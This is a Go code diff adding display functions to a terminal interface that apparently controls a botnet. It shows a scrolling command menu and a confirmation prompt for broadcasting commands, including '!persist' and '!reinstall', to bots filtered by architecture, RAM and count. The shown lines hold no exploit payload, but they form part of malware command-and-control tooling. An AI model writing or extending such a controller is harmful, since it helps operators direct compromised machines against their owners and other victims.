+
+	// Scrolling window of 10 items max
+	maxVisible := 10
+	startIdx := 0
+	if cursor >= maxVisible {
+		startIdx = cursor - maxVisible + 1
+	}
+	endIdx := startIdx + maxVisible
+	if endIdx > len(list) {
+		endIdx = len(list)
+	}
+
+	for i := startIdx; i < endIdx; i++ {
+		sc := list[i]
+		if i == cursor {
+			selector := neonPink.Bold(true).Render(" ► ")
+			name := neonCyan.Bold(true).Render(fmt.Sprintf("%-16s", sc.name))
+			desc := white.Render(sc.desc)
+			b.WriteString(fmt.Sprintf("  %s%s %s\n", selector, name, desc))
+		} else {
+			name := dim.Render(fmt.Sprintf("%-16s", sc.name))
+			desc := dim.Render(sc.desc)
+			b.WriteString(fmt.Sprintf("      %s %s\n", name, desc))
+		}
+	}
+
+	// Scroll indicator
+	if len(list) > maxVisible {
+		b.WriteString(dim.Render(fmt.Sprintf("  %d/%d", cursor+1, len(list))))
+		if startIdx > 0 {
+			b.WriteString(dim.Render(" ↑"))
+		}
+		if endIdx < len(list) {
+			b.WriteString(dim.Render(" ↓"))
+		}
+		b.WriteString("\n")
+	}
+}
+
+// renderBroadcastConfirm renders the confirmation prompt for broadcast commands
+func (m TUIModel) renderBroadcastConfirm(b *strings.Builder,
+	neonGreen, neonRed, neonCyan, neonYellow, dim, white lipgloss.Style) {
+
+	warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
+	targetCount := countFilteredBots(m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)
+
+	if m.confirmPersist {
+		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast !persist to %d bots?", targetCount)))
+	} else if m.confirmReinstall {
+		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast !reinstall to %d bots?", targetCount)))
+	} else {
+		// Truncate long commands for display
+		displayCmd := m.pendingBroadcastCmd
+		if len(displayCmd) > 50 {
+			displayCmd = displayCmd[:47] + "..."
+		}
+		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast to %d bots:", targetCount)))
+		b.WriteString("\n")
+		b.WriteString("  " + neonCyan.Render(displayCmd))
+	}
+	b.WriteString("\n")
+	b.WriteString(fmt.Sprintf("  %s Confirm   %s Cancel\n",
+		neonGreen.Render("[y]"),
+		neonRed.Render("[n]")))
 }
 
 func (m TUIModel) viewHelp() string {
